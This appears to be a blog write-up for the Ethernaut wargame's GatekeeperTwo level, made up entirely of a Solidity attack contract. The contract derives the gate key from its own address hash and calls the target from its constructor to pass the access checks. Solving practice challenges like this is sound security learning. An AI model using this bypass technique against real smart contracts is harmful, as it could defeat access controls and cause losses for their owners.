+++
title = 'Ethernaut Level 14 - Gatekeepertwo'
date = 2024-08-28T16:14:08+02:00
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Break even more gates'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack{
    bool public  success = false;
    constructor(address _addr) {
        GatekeeperTwo target = GatekeeperTwo(_addr);
        bytes8 key = bytes8(abi.encodePacked(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max));
        success = target.enter(key);
        
    }
}
```